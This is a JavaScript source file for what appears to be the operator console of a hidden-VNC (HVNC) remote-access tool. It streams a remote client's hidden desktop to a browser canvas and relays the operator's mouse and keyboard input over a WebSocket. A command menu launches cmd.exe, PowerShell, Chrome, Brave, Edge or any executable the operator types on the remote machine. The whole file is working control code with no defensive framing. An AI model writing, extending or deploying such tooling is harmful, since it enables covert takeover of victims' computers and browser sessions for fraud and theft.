import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";

(function () {
  const clientId = new URLSearchParams(location.search).get("clientId");
  if (!clientId) {
    alert("Missing clientId");
    return;
  }
  const clientLabel = document.getElementById("clientLabel");
  clientLabel.textContent = clientId;

  const ws = new WebSocket(
    (location.protocol === "https:" ? "wss://" : "ws://") +
      location.host +
      "/api/clients/" +
      clientId +
      "/hvnc/ws",
  );
  const displaySelect = document.getElementById("displaySelect");
  const refreshBtn = document.getElementById("refreshDisplays");
  const startBtn = document.getElementById("startBtn");
  const stopBtn = document.getElementById("stopBtn");
  const commandsBtn = document.getElementById("commandsBtn");
  const fullscreenBtn = document.getElementById("fullscreenBtn");
  const mouseCtrl = document.getElementById("mouseCtrl");
  const kbdCtrl = document.getElementById("kbdCtrl");
  const cursorCtrl = document.getElementById("cursorCtrl");
  const qualitySlider = document.getElementById("qualitySlider");
  const qualityValue = document.getElementById("qualityValue");
  const canvas = document.getElementById("frameCanvas");
  const canvasContainer = document.getElementById("canvasContainer");
  const contextMenu = document.getElementById("hvncContextMenu");
  const ctx = canvas.getContext("2d");
  const agentFps = document.getElementById("agentFps");
  const viewerFps = document.getElementById("viewerFps");
  const statusEl = document.getElementById("streamStatus");
  ws.binaryType = "arraybuffer";

  let activeClientId = clientId;
  let renderCount = 0;
  let renderWindowStart = performance.now();
  let lastFrameAt = 0;
  let desiredStreaming = false;
  let streamState = "connecting";
  let frameWatchTimer = null;
  let offlineTimer = null;
  let pendingMove = null;
  let moveTimer = null;
  let lastMoveSentAt = 0;
  const mouseMoveIntervalMs = 33;
  const inputBackpressureBytes = 256 * 1024;
  setStreamState("connecting", "Connecting");

  function updateFpsDisplay(agentValue) {
    if (agentValue !== undefined && agentValue !== null && agentFps) {
      agentFps.textContent = String(agentValue);
    }
    const now = performance.now();
    renderCount += 1;
    const elapsed = now - renderWindowStart;
    if (elapsed >= 1000 && viewerFps) {
      const fps = Math.round((renderCount * 1000) / elapsed);
      viewerFps.textContent = String(fps);
      renderCount = 0;
      renderWindowStart = now;
    }
  }

  function setStreamState(state, text) {
    streamState = state;
    if (statusEl) {
      const icons = {
        connecting: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        starting: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        stopping: '<i class="fa-solid fa-circle-notch fa-spin"></i>',
        streaming: '<i class="fa-solid fa-circle text-violet-400"></i>',
        idle: '<i class="fa-solid fa-circle text-slate-400"></i>',
        stalled: '<i class="fa-solid fa-triangle-exclamation text-amber-400"></i>',
        offline: '<i class="fa-solid fa-plug-circle-xmark text-rose-400"></i>',
        disconnected: '<i class="fa-solid fa-link-slash text-slate-400"></i>',
        error: '<i class="fa-solid fa-circle-exclamation text-rose-400"></i>',
      };
      const label = text ||
        (state === "streaming" ? "Streaming" :
          state === "starting" ? "Starting" :
            state === "stopping" ? "Stopping" :
              state === "offline" ? "Client offline" :
                state === "disconnected" ? "Disconnected" :
                  state === "stalled" ? "No frames" :
                    state === "idle" ? "Stopped" :
                      "Connecting");

      statusEl.innerHTML = `${icons[state] || icons.idle} <span>${label}</span>`;
      const base = "inline-flex items-center gap-2 px-3 py-2 rounded-full border text-sm";
      const styles = {
        streaming: "bg-violet-900/40 text-violet-100 border-violet-700/70",
        starting: "bg-sky-900/40 text-sky-100 border-sky-700/70",
        stopping: "bg-amber-900/40 text-amber-100 border-amber-700/70",
        stalled: "bg-amber-900/40 text-amber-100 border-amber-700/70",
        offline: "bg-rose-900/40 text-rose-100 border-rose-700/70",
        error: "bg-rose-900/40 text-rose-100 border-rose-700/70",
        disconnected: "bg-slate-800 text-slate-300 border-slate-700",
        idle: "bg-slate-800 text-slate-300 border-slate-700",
        connecting: "bg-slate-800 text-slate-300 border-slate-700",
      };
      statusEl.className = `${base} ${styles[state] || styles.idle}`;
    }

    if (canvasContainer) {
      canvasContainer.dataset.streamState = state;
    }

    if (state === "idle" || state === "offline" || state === "disconnected" || state === "error") {
      if (agentFps) agentFps.textContent = "--";
      if (viewerFps) viewerFps.textContent = "--";
      renderCount = 0;
      renderWindowStart = performance.now();
    }

    updateControls();
  }

  function updateControls() {
    const wsOpen = ws.readyState === WebSocket.OPEN;
    const isStarting = streamState === "starting";
    const isStreaming = streamState === "streaming";
    const isStopping = streamState === "stopping";
    const isBlocked = streamState === "offline" || streamState === "disconnected" || streamState === "error";

    if (startBtn) {
      startBtn.disabled = !wsOpen || isStarting || isStreaming || isStopping || isBlocked;
    }
    if (stopBtn) {
      stopBtn.disabled = !wsOpen || (!isStarting && !isStreaming);
    }
  }

  function clearOfflineTimer() {
    if (offlineTimer) {
      clearTimeout(offlineTimer);
      offlineTimer = null;
    }
  }

  function scheduleOffline(reason) {
    clearOfflineTimer();
    setStreamState("connecting", "Reconnecting");
    offlineTimer = setTimeout(() => {
      const now = performance.now();
      if (!lastFrameAt || now - lastFrameAt > 3000) {
        desiredStreaming = false;
        setStreamState("offline", reason || "Client offline");
      }
    }, 3000);
  }

  function handleStatus(msg) {
    if (!msg || msg.type !== "status" || !msg.status) return;
    if (msg.status === "offline") {
      scheduleOffline(msg.reason);
      return;
    }
    if (msg.status === "connecting") {
      clearOfflineTimer();
      setStreamState("connecting", "Connecting");
      return;
    }
    if (msg.status === "online") {
      clearOfflineTimer();
      if (desiredStreaming) {
        setStreamState("starting", "Reconnecting");
        if (displaySelect && displaySelect.value !== undefined) {
          sendCmd("hvnc_select_display", {
            display: parseInt(displaySelect.value, 10) || 0,
          });
        }
        sendCmd("hvnc_start", {});
      } else {
        setStreamState("idle", "Stopped");
      }
    }
  }

  function sendCmd(type, payload) {
    if (!activeClientId) {
      console.warn("No active client selected");
      return;
    }
    if (ws.readyState !== WebSocket.OPEN) {
      return;
    }
    const msg = { type, ...payload };
    console.debug("hvnc: send", msg);
    ws.send(encodeMsgpack(msg));
  }

  let monitors = 1;

  function populateDisplays(count) {
    displaySelect.innerHTML = "";
    monitors = count || 1;
    for (let i = 0; i < monitors; i++) {
      const opt = document.createElement("option");
      opt.value = i;
      opt.textContent = "Display " + (i + 1);
      displaySelect.appendChild(opt);
    }

    if (displaySelect.options.length) {
      displaySelect.value = displaySelect.options[0].value;
    }
  }

  async function fetchClientInfo() {
    try {
      const res = await fetch("/api/clients");
      const data = await res.json();
      const client = data.items.find((c) => c.id === activeClientId);
      if (client) {
        clientLabel.textContent = `${client.host || client.id} (${client.os || ""})`;
      }
      if (client && client.monitors) {
        populateDisplays(client.monitors);
      }
    } catch (e) {
      console.warn("failed to fetch client info", e);
    }
  }

  refreshBtn.addEventListener("click", fetchClientInfo);

  function updateQualityLabel(val) {
    if (qualityValue) {
      qualityValue.textContent = `${val}%`;
    }
  }

  function pushQuality(val) {
    const q = Number(val) || 90;
    const codec = q >= 100 ? "raw" : "jpeg";
    console.debug("hvnc: pushQuality val=", val, "q=", q, "codec=", codec);
    sendCmd("hvnc_set_quality", { quality: q, codec });
  }

  displaySelect.addEventListener("change", function () {
    console.debug("hvnc: select display", displaySelect.value);
    sendCmd("hvnc_select_display", {
      display: parseInt(displaySelect.value, 10),
    });
  });

  startBtn.addEventListener("click", function () {
    if (displaySelect && displaySelect.value !== undefined) {
      sendCmd("hvnc_select_display", {
        display: parseInt(displaySelect.value, 10) || 0,
      });
    }
    if (qualitySlider) {
      pushQuality(qualitySlider.value);
    }
    desiredStreaming = true;
    lastFrameAt = 0;
    setStreamState("starting", "Starting stream");
    sendCmd("hvnc_start", {});
  });
  stopBtn.addEventListener("click", function () {
    desiredStreaming = false;
    setStreamState("stopping", "Stopping stream");
    sendCmd("hvnc_stop", {});
  });
  fullscreenBtn.addEventListener("click", function () {
    if (canvasContainer.requestFullscreen) {
      canvasContainer.requestFullscreen();
    } else if (canvasContainer.webkitRequestFullscreen) {
      canvasContainer.webkitRequestFullscreen();
    } else if (canvasContainer.mozRequestFullScreen) {
      canvasContainer.mozRequestFullScreen();
    }
  });
  mouseCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
  });
  kbdCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
  });
  cursorCtrl.addEventListener("change", function () {
    sendCmd("hvnc_enable_cursor", { enabled: cursorCtrl.checked });
  });

  if (qualitySlider) {
    updateQualityLabel(qualitySlider.value);
    qualitySlider.addEventListener("input", function () {
      updateQualityLabel(qualitySlider.value);
      pushQuality(qualitySlider.value);
    });
  }

  ws.addEventListener("message", async function (ev) {
    if (ev.data instanceof ArrayBuffer) {
      const buf = new Uint8Array(ev.data);
      if (buf.length >= 8 && buf[0] === 0x46 && buf[1] === 0x52 && buf[2] === 0x4d) {
        const fps = buf[5];
        const format = buf[6];
        lastFrameAt = performance.now();
        clearOfflineTimer();
        if (streamState !== "streaming") {
          desiredStreaming = true;
          setStreamState("streaming", "Streaming");
        }

        if (format === 1) {
          const jpegBytes = buf.slice(8);
          const blob = new Blob([jpegBytes], { type: "image/jpeg" });
          try {
            const bitmap = await createImageBitmap(blob);
            canvas.width = bitmap.width;
            canvas.height = bitmap.height;
            ctx.drawImage(bitmap, 0, 0);
            bitmap.close();
            updateFpsDisplay(fps);
          } catch {
            const img = new Image();
            const url = URL.createObjectURL(blob);
            img.onload = function () {
              canvas.width = img.width;
              canvas.height = img.height;
              ctx.drawImage(img, 0, 0);
              URL.revokeObjectURL(url);
              updateFpsDisplay(fps);
            };
            img.src = url;
          }
          return;
        }

        if (format === 2 || format === 3) {
          if (buf.length < 8 + 8) return;
          const dv = new DataView(buf.buffer, 8);
          let pos = 0;
          const width = dv.getUint16(pos, true);
          pos += 2;
          const height = dv.getUint16(pos, true);
          pos += 2;
          const blockCount = dv.getUint16(pos, true);
          pos += 2;
          pos += 2;

          if (
            width > 0 &&
            height > 0 &&
            (canvas.width !== width || canvas.height !== height)
          ) {
            canvas.width = width;
            canvas.height = height;
          }
          for (let i = 0; i < blockCount; i++) {
            if (pos + 12 > dv.byteLength) break;
            const x = dv.getUint16(pos, true);
            pos += 2;
            const y = dv.getUint16(pos, true);
            pos += 2;
            const w = dv.getUint16(pos, true);
            pos += 2;
            const h = dv.getUint16(pos, true);
            pos += 2;
            const len = dv.getUint32(pos, true);
            pos += 4;
            const start = 8 + pos;
            const end = start + len;
            if (end > buf.length) break;
            const slice = buf.subarray(start, end);
            pos += len;
            if (format === 2) {
              try {
                const bitmap = await createImageBitmap(
                  new Blob([slice], { type: "image/jpeg" }),
                );
                ctx.drawImage(bitmap, x, y, w, h);
                bitmap.close();
              } catch {}
            } else {
              if (slice.length === w * h * 4) {
                const imgData = new ImageData(new Uint8ClampedArray(slice), w, h);
                ctx.putImageData(imgData, x, y);
              }
            }
          }
          updateFpsDisplay(fps);
          return;
        }
      }

      const msg = decodeMsgpack(buf);
      if (msg && msg.type === "status" && msg.status) {
        handleStatus(msg);
        return;
      }
      return;
    }

    const msg = decodeMsgpack(ev.data);
    if (msg && msg.type === "status" && msg.status) {
      handleStatus(msg);
      return;
    }
  });

  ws.addEventListener("open", function () {
    if (qualitySlider) {
      pushQuality(qualitySlider.value);
    }
    clearOfflineTimer();
    setStreamState("idle", "Stopped");
    fetchClientInfo().then(() => {
      if (displaySelect && displaySelect.value) {
        console.debug("hvnc: initial select display", displaySelect.value);
        sendCmd("hvnc_select_display", {
          display: parseInt(displaySelect.value, 10),
        });
      }
    });
  });

  ws.addEventListener("close", function () {
    desiredStreaming = false;
    setStreamState("disconnected", "Disconnected");
  });

  ws.addEventListener("error", function () {
    setStreamState("error", "WebSocket error");
  });

  if (!frameWatchTimer) {
    frameWatchTimer = setInterval(() => {
      const now = performance.now();
      if (desiredStreaming) {
        if (lastFrameAt && now - lastFrameAt > 2000) {
          setStreamState("stalled", "No frames");
        } else if (!lastFrameAt && streamState === "starting") {
          setStreamState("starting", "Starting stream");
        }
      } else if (streamState !== "offline" && streamState !== "disconnected" && streamState !== "error") {
        if (streamState !== "idle") {
          setStreamState("idle", "Stopped");
        }
      }
    }, 1000);
  }

  function getCanvasPoint(e) {
    let rect = canvas.getBoundingClientRect();
    if (!rect.width || !rect.height) {
      rect = canvasContainer?.getBoundingClientRect() || rect;
    }
    if (!rect.width || !rect.height || !canvas.width || !canvas.height) return null;
    let x = ((e.clientX - rect.left) / rect.width) * canvas.width;
    let y = ((e.clientY - rect.top) / rect.height) * canvas.height;
    if (!Number.isFinite(x) || !Number.isFinite(y)) return null;
    x = Math.max(0, Math.min(canvas.width - 1, Math.floor(x)));
    y = Math.max(0, Math.min(canvas.height - 1, Math.floor(y)));
    return { x, y };
  }

  function flushMouseMove() {
    moveTimer = null;
    if (!pendingMove || !mouseCtrl.checked) return;
    const now = performance.now();
    if (now - lastMoveSentAt < mouseMoveIntervalMs) {
      if (!moveTimer) {
        moveTimer = setTimeout(flushMouseMove, mouseMoveIntervalMs);
      }
      return;
    }
    lastMoveSentAt = now;
    if (ws.bufferedAmount <= inputBackpressureBytes) {
      sendCmd("hvnc_mouse_move", pendingMove);
    }
  }

  canvas.addEventListener("mousemove", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (!pt) return;
    pendingMove = pt;
    if (!moveTimer) {
      flushMouseMove();
    }
  });
  canvas.addEventListener("mousedown", function (e) {
    if (!mouseCtrl.checked) return;
    canvas.focus();
    const pt = getCanvasPoint(e);
    if (pt) {
      pendingMove = pt;
      if (ws.bufferedAmount <= inputBackpressureBytes) {
        sendCmd("hvnc_mouse_move", pt);
      }
    }
    sendCmd("hvnc_mouse_down", { button: e.button, ...(pt || {}) });
    e.preventDefault();
  });
  canvas.addEventListener("mouseup", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (pt) {
      pendingMove = pt;
      if (ws.bufferedAmount <= inputBackpressureBytes) {
        sendCmd("hvnc_mouse_move", pt);
      }
    }
    sendCmd("hvnc_mouse_up", { button: e.button, ...(pt || {}) });
    e.preventDefault();
  });
  canvas.addEventListener("contextmenu", function (e) {
    e.preventDefault();
  });

  canvas.addEventListener("wheel", function (e) {
    if (!mouseCtrl.checked) return;
    const pt = getCanvasPoint(e);
    if (!pt) return;
    const delta = Math.max(-120, Math.min(120, Math.round(-e.deltaY)));
    sendCmd("hvnc_mouse_wheel", { delta, x: pt.x, y: pt.y });
    e.preventDefault();
  }, { passive: false });

  canvas.setAttribute("tabindex", "0");
  canvas.addEventListener("click", function () {
    canvas.focus();
  });
  if (kbdCtrl) {
    kbdCtrl.addEventListener("change", function () {
      if (kbdCtrl.checked) {
        canvas.focus();
      }
    });
  }
  canvas.addEventListener("keydown", function (e) {
    if (!kbdCtrl.checked) return;
    sendCmd("hvnc_key_down", { key: e.key, code: e.code });
    e.preventDefault();
  });
  canvas.addEventListener("keyup", function (e) {
    if (!kbdCtrl.checked) return;
    sendCmd("hvnc_key_up", { key: e.key, code: e.code });
    e.preventDefault();
  });

  function stopOnExit() {
    if (ws.readyState === WebSocket.OPEN && desiredStreaming) {
      desiredStreaming = false;
      sendCmd("hvnc_stop", {});
    }
  }

  window.addEventListener("beforeunload", stopOnExit);
  window.addEventListener("pagehide", stopOnExit);

  function hideContextMenu() {
    if (!contextMenu) return;
    contextMenu.classList.add("hidden");
  }

  function showContextMenuAt(x, y) {
    if (!contextMenu) return;
    contextMenu.style.left = `${x}px`;
    contextMenu.style.top = `${y}px`;
    contextMenu.classList.remove("hidden");
  }

  document.addEventListener("click", (e) => {
    if (!contextMenu) return;
    if (commandsBtn && commandsBtn.contains(e.target)) {
      return;
    }
    if (!contextMenu.contains(e.target)) {
      hideContextMenu();
    }
  });

  if (commandsBtn) {
    commandsBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      const rect = commandsBtn.getBoundingClientRect();
      showContextMenuAt(rect.left, rect.bottom + 6);
    });
  }

  if (contextMenu) {
    contextMenu.querySelectorAll("[data-action]").forEach((item) => {
      item.addEventListener("click", (e) => {
        const action = e.currentTarget?.dataset?.action;
        if (action === "start-cmd") {
          sendCmd("hvnc_start_process", { path: "conhost cmd.exe" });
        } else if (action === "start-powershell") {
          sendCmd("hvnc_start_process", { path: "conhost powershell.exe" });
        } else if (action === "start-chrome") {
          sendCmd("hvnc_start_process", { path: "c:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" });
        } else if (action === "start-brave") {
          sendCmd("hvnc_start_process", { path: "c:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" });
        } else if (action === "start-edge") {
          sendCmd("hvnc_start_process", { path: "c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" });
        } else if (action === "start-custom") {
          const exePath = prompt("Enter exe path (required)");
          if (!exePath) {
            hideContextMenu();
            return;
          }
          const args = prompt("Enter arguments (optional)") || "";
          const cmd = args.trim() ? `\"${exePath}\" ${args}` : `\"${exePath}\"`;
          sendCmd("hvnc_start_process", { path: cmd });
        }
        hideContextMenu();
      });
    });
  }

  fetchClientInfo();
})();
